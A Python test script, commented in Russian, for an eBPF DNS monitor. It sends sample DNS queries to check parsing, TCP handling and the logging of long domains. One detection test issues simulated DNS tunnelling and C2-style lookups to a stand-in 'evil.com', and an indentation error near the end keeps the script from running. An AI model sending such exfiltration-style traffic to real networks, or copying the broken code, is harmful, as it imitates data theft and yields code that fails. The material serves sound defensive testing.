#!/usr/bin/env python3
"""
Тест улучшенной версии eBPF DNS Monitor
========================================

Проверяет ВСЕ пункты из KERNEL_ANALYSIS.md (8.1, 8.2):

8.1.1 ✓ kretprobe для recvmsg (корректные ответы)
8.1.2 ✓ TCP DNS поддержка
8.1.3 ✓ Буфер 256 байт (длинные домены)
8.2.1 ✓ DNS заголовок (transaction ID, flags)
8.2.2 ✓ Kernel timestamp
8.2.3 ✓ Pod идентификация (cgroup_id)

Запуск:
    1. Терминал 1: sudo python3 dns_analyzer_improved.py
    2. Терминал 2: python3 test_improved_version.py
"""

import subprocess
import socket
import struct
import time
import os
import sys
from datetime import datetime

# ===== ЦВЕТА =====
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====

def print_header(text):
    print(f"\n{BOLD}{'='*70}{RESET}")
    print(f"{BOLD} {text}{RESET}")
    print(f"{BOLD}{'='*70}{RESET}")

def print_test(num, name, description):
    print(f"\n{CYAN}[Тест {num}]{RESET} {BOLD}{name}{RESET}")
    print(f"         {description}")

def print_check(item):
    print(f"         {GREEN}✓{RESET} {item}")

def print_action(cmd):
    print(f"         {YELLOW}→{RESET} {cmd}")

def run_cmd(cmd, timeout=5):
    """Выполняет команду"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=timeout
        )
        return True, result.returncode
    except subprocess.TimeoutExpired:
        return True, 0  # Timeout OK для DNS
    except Exception as e:
        return False, str(e)

def build_dns_query(domain, qtype=1):
    """Создаёт DNS запрос"""
    # Transaction ID (random)
    import random
    tid = random.randint(0, 65535)
    tid_bytes = struct.pack('>H', tid)
    
    # Flags: standard query
    flags = struct.pack('>H', 0x0100)
    
    # Questions=1, Answers=0, Authority=0, Additional=0
    counts = struct.pack('>HHHH', 1, 0, 0, 0)
    
    # Encode domain
    qname = b''
    for label in domain.split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    
    # Type and Class
    qtype_class = struct.pack('>HH', qtype, 1)
    
    return tid_bytes + flags + counts + qname + qtype_class

def send_udp_dns(domain, qtype=1, server='8.8.8.8'):
    """Отправляет UDP DNS запрос"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    
    query = build_dns_query(domain, qtype)
    
    try:
        sock.sendto(query, (server, 53))
        response, _ = sock.recvfrom(1024)
        return True, len(response)
    except socket.timeout:
        return False, "timeout"
    except Exception as e:
        return False, str(e)
    finally:
        sock.close()

def send_tcp_dns(domain, qtype=1, server='8.8.8.8'):
    """Отправляет TCP DNS запрос"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    query = build_dns_query(domain, qtype)
    
    # TCP DNS: 2-byte length prefix
    tcp_query = struct.pack('>H', len(query)) + query
    
    try:
        sock.connect((server, 53))
        sock.send(tcp_query)
        
        # Read response length
        length_data = sock.recv(2)
        if len(length_data) < 2:
            return False, "no response"
        
        resp_length = struct.unpack('>H', length_data)[0]
        response = sock.recv(resp_length)
        
        return True, len(response)
    except socket.timeout:
        return False, "timeout"
    except Exception as e:
        return False, str(e)
    finally:
        sock.close()

# ===== ТЕСТЫ =====

def test_8_1_1_kretprobe():
    """Тест 8.1.1: kretprobe для корректных ответов"""
    print_test("8.1.1", "kretprobe для UDP ответов", 
               "Проверяем что RESPONSE события содержат данные")
    
    tests = [
        ("google.com", 1, "A запрос"),
        ("ya.ru", 1, "A запрос"),
        ("cloudflare.com", 28, "AAAA запрос"),
    ]
    
    for domain, qtype, desc in tests:
        print_action(f"UDP {desc}: {domain}")
        success, result = send_udp_dns(domain, qtype)
        if success:
            print_check(f"Отправлено, ответ {result} байт")
        else:
            print(f"         {RED}✗{RESET} Ошибка: {result}")
        time.sleep(0.3)
    
    print_check("В логах должны быть QUERY и RESPONSE с доменами (не <unparseable>)")
    return True

def test_8_1_2_tcp_dns():
    """Тест 8.1.2: TCP DNS поддержка"""
    print_test("8.1.2", "TCP DNS поддержка",
               "Проверяем перехват TCP DNS запросов и ответов")
    
    # Тест 1: Прямой TCP DNS через socket
    print_action("Прямой TCP DNS через socket:")
    tests = [
        ("google.com", 1, "A"),
        ("microsoft.com", 16, "TXT"),
        ("github.com", 1, "A"),
    ]
    
    for domain, qtype, type_name in tests:
        print_action(f"  TCP {type_name} запрос: {domain}")
        success, result = send_tcp_dns(domain, qtype)
        if success:
            print_check(f"  TCP ответ получен: {result} байт")
        else:
            print(f"         {YELLOW}⚠{RESET} TCP: {result} (может быть заблокирован)")
        time.sleep(0.3)
    
    # Тест 2: dig +tcp (может отправлять по-другому)
    print_action("dig +tcp (разные домены):")
    for domain in ["example.com", "cloudflare.com", "github.com"]:
        print_action(f"  dig +tcp {domain}")
        run_cmd(f"dig +tcp {domain} +short +tries=1 +time=2")
        time.sleep(0.3)
    
    # Тест 3: Множественные TCP запросы
    print_action("Множественные TCP запросы:")
    for i in range(3):
        domain = f"tcp-test-{i}.example.com"
        print_action(f"  TCP запрос {i+1}: {domain}")
        send_tcp_dns(domain)
        time.sleep(0.2)
    
    print_check("В логах должны быть события с protocol=TCP")
    print_check("TCP QUERY должны парситься (не <unparseable>)")
    print_check("TCP RESPONSE должны парситься корректно")
    return True

def test_8_1_3_large_buffer():
    """Тест 8.1.3: Буфер 256 байт для длинных доменов"""
    print_test("8.1.3", "Увеличенный буфер (256 байт)",
               "Проверяем перехват очень длинных доменов")
    
    # Максимальная длина DNS label = 63, общая = 253
    tests = [
        # 50 символов в subdomain
        ("a" * 50 + ".test.com", "50 символов"),
        # 63 символа (максимум для label)
        ("b" * 63 + ".example.org", "63 символа (max label)"),
        # Много subdomains
        ("a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.test.com", "17 subdomains"),
        # Длинный с base64
        ("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw.tunnel.evil.com", "Base64 subdomain"),
    ]
    
    for domain, desc in tests:
        print_action(f"Длинный домен ({desc}): {len(domain)} символов")
        run_cmd(f"dig {domain} +short +tries=1 +time=1")
        print_check(f"Запрос отправлен")
        time.sleep(0.3)
    
    print_check("В логах домены должны быть ПОЛНЫМИ (не обрезанными)")
    return True

def test_8_2_1_dns_header():
    """Тест 8.2.1: DNS заголовок сохраняется"""
    print_test("8.2.1", "DNS заголовок (transaction ID, flags)",
               "Проверяем что заголовок парсится корректно")
    
    # Разные типы запросов
    tests = [
        ("example.com", 1, "A"),
        ("example.com", 16, "TXT"),
        ("example.com", 15, "MX"),
        ("example.com", 28, "AAAA"),
        ("example.com", 2, "NS"),
    ]
    
    for domain, qtype, type_name in tests:
        print_action(f"DNS {type_name} запрос: {domain}")
        success, _ = send_udp_dns(domain, qtype)
        if success:
            print_check(f"Тип {type_name} отправлен")
        time.sleep(0.3)
    
    print_check("В логах должны быть разные типы: A, TXT, MX, AAAA, NS")
    return True

def test_8_2_2_timestamp():
    """Тест 8.2.2: Kernel timestamp"""
    print_test("8.2.2", "Kernel timestamp",
               "Проверяем наличие timestamp из ядра")
    
    print_action("Отправляем 3 запроса с интервалом 1 сек")
    
    for i in range(3):
        domain = f"timestamp-test-{i}.example.com"
        print_action(f"Запрос {i+1}: {domain}")
        run_cmd(f"dig {domain} +short +tries=1 +time=1")
        time.sleep(1)
    
    print_check("В логах timestamp должен увеличиваться примерно на 1 сек")
    return True

def test_8_2_3_pod_identification():
    """Тест 8.2.3: Идентификация пода"""
    print_test("8.2.3", "Pod идентификация (cgroup_id, netns_id)",
               "Проверяем что cgroup_id и netns_id передаются")
    
    # Показываем текущий cgroup
    print_action("Текущий cgroup процесса:")
    try:
        with open(f"/proc/{os.getpid()}/cgroup", 'r') as f:
            cgroup = f.read().strip()
            for line in cgroup.split('\n')[:3]:
                print(f"         {line}")
    except:
        print("         (не удалось прочитать)")
    
    # Отправляем запросы от разных процессов
    print_action("DNS запросы от разных процессов:")
    
    # dig
    run_cmd("dig pod-test-dig.example.com +short +tries=1 +time=1")
    print_check("dig отправлен")
    
    # nslookup
    run_cmd("nslookup pod-test-nslookup.example.com 2>/dev/null || true")
    print_check("nslookup отправлен")
    
    # Python (текущий процесс)
    send_udp_dns("pod-test-python.example.com")
    print_check("Python UDP отправлен")
    
    # curl (если DNS)
    run_cmd("curl -s --max-time 2 http://pod-test-curl.example.com/ 2>/dev/null || true")
    print_check("curl отправлен")
    
    print_check("В логах должны быть разные PID и (в K8s) pod идентификаторы")
    return True

def test_suspicious_patterns():
    """Дополнительный тест: подозрительные паттерны"""
    print_test("EXTRA", "Подозрительные паттерны",
               "Проверяем детекцию подозрительного трафика")
    
    tests = [
        # Высокая entropy
        ("dig aHR0cHM6Ly9ldmlsLmNvbS9tYWx3YXJl.evil.com +short", "Base64 в домене"),
        # TXT запрос (C2)
        ("dig txt suspicious-c2-domain.com +short", "TXT запрос (C2)"),
        # NULL запрос (IP-Over-DNS)
        ("dig type10 tunnel.iodine.com +short", "NULL запрос (tunnel)"),
        # Очень длинный
        ("dig $(python3 -c \"print('x'*60)\").evil.com +short", "60-символьный subdomain"),
    ]
    
    for cmd, desc in tests:
        print_action(f"{desc}")
        run_cmd(cmd)
        print_check("Отправлено")
        time.sleep(0.3)
    
    print_check("В логах должны быть ⚠ SUSPICIOUS предупреждения")
    return True

def test_edge_cases():
    """Тест edge cases"""
    print_test("EDGE", "Edge cases",
               "Проверяем граничные случаи")
    
    # Compression pointers (если есть в ответах)
    print_action("Разные DNS типы для проверки парсинга:")
    for qtype, name in [(1, "A"), (2, "NS"), (5, "CNAME"), (15, "MX"), (16, "TXT"), (28, "AAAA")]:
        domain = f"edge-{name.lower()}.test.com"
        print_action(f"  {name} запрос: {domain}")
        send_udp_dns(domain, qtype)
        time.sleep(0.2)
    
    # Многоуровневые домены
    print_action("Многоуровневые домены:")
    long_domains = [
        "a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.test.com",
        "sub1.sub2.sub3.sub4.sub5.example.org",
    ]
    for domain in long_domains:
        print_action(f"  {len(domain.split('.'))} уровней: {domain[:50]}...")
        run_cmd(f"dig {domain} +short +tries=1 +time=1")
        time.sleep(0.2)
    
    print_check("Все типы должны парситься корректно")
    return True

def test_performance():
    """Тест производительности (базовый)"""
    print_test("PERF", "Производительность",
               "Проверяем работу при нагрузке")
    
    print_action("Генерация 50 DNS запросов...")
    domains = [f"perf-test-{i}.example.com" for i in range(50)]
    
    start = time.time()
    for domain in domains:
        run_cmd(f"dig {domain} +short +tries=1 +time=1")
    elapsed = time.time() - start
    
    print_check(f"50 запросов за {elapsed:.1f} сек ({50/elapsed:.1f} req/sec)")
    print_check("Все события должны быть перехвачены")
    print_check("Не должно быть потери событий")
    
    return True

# ===== ГЛАВНАЯ ФУНКЦИЯ =====

def main():
    import sys
    
    # Проверяем автоматический режим (через переменную окружения или аргумент)
    AUTO_MODE = os.environ.get('AUTO_TEST_MODE', '0') == '1' or '--auto' in sys.argv
    
    print_header("ТЕСТИРОВАНИЕ УЛУЧШЕННОЙ ВЕРСИИ eBPF DNS MONITOR")
    
    print(f"""
{BOLD}Этот скрипт проверяет все пункты из KERNEL_ANALYSIS.md:{RESET}

  8.1.1  kretprobe для корректных ответов
  8.1.2  TCP DNS поддержка  
  8.1.3  Буфер 256 байт (длинные домены)
  8.2.1  DNS заголовок (transaction ID, flags, type)
  8.2.2  Kernel timestamp
  8.2.3  Pod идентификация (cgroup_id, netns_id)

{YELLOW}ВАЖНО:{RESET} Запустите dns_analyzer_improved.py в другом терминале:
        {CYAN}sudo python3 dns_analyzer_improved.py{RESET}
""")
    
    if not AUTO_MODE:
    input(f"\n{YELLOW}Нажмите Enter когда анализатор запущен...{RESET}")
    else:
        print(f"\n{YELLOW}[АВТОМАТИЧЕСКИЙ РЕЖИМ] Ожидание 3 секунды перед началом тестов...{RESET}")
        time.sleep(3)
    
    # Запускаем все тесты
    tests = [
        ("8.1.1", test_8_1_1_kretprobe),
        ("8.1.2", test_8_1_2_tcp_dns),
        ("8.1.3", test_8_1_3_large_buffer),
        ("8.2.1", test_8_2_1_dns_header),
        ("8.2.2", test_8_2_2_timestamp),
        ("8.2.3", test_8_2_3_pod_identification),
        ("EXTRA", test_suspicious_patterns),
        ("EDGE", test_edge_cases),
        ("PERF", test_performance),
    ]
    
    results = []
    for name, test_func in tests:
        try:
            result = test_func()
            results.append((name, result))
        except Exception as e:
            print(f"{RED}Ошибка в тесте {name}: {e}{RESET}")
            results.append((name, False))
        time.sleep(1)
    
    # Итоги
    print_header("ИТОГИ ТЕСТИРОВАНИЯ")
    
    print(f"""
{BOLD}Чеклист проверки (смотрите логи dns_analyzer_improved.py):{RESET}

┌─────────────────────────────────────────────────────────────────────┐
│  Пункт   │ Что проверить в логах                                   │
├─────────────────────────────────────────────────────────────────────┤
│  8.1.1   │ RESPONSE события содержат домены (не <unparseable>)     │
│  8.1.2   │ Есть события с "TCP" (не только UDP)                    │
│  8.1.2   │ ⚠ TCP QUERY должны парситься (не <unparseable>)        │
│  8.1.3   │ Длинные домены показаны полностью (60+ символов)        │
│  8.2.1   │ DNS типы разные: A, TXT, MX, AAAA, NS                   │
│  8.2.2   │ Timestamp увеличивается между запросами                 │
│  8.2.3   │ Разные PID для разных процессов                         │
│  EXTRA   │ ⚠ SUSPICIOUS для подозрительных доменов                 │
│  EDGE    │ Все DNS типы парсятся корректно                         │
│  PERF    │ Все события перехвачены при нагрузке                     │
└─────────────────────────────────────────────────────────────────────┘

{BOLD}Для полного отчёта нажмите Ctrl+C в терминале с анализатором{RESET}
""")
    
    print(f"\n{GREEN}Все тесты выполнены!{RESET}")
    print(f"\nСохраните скриншоты логов для диплома.")

if __name__ == "__main__":
    main()
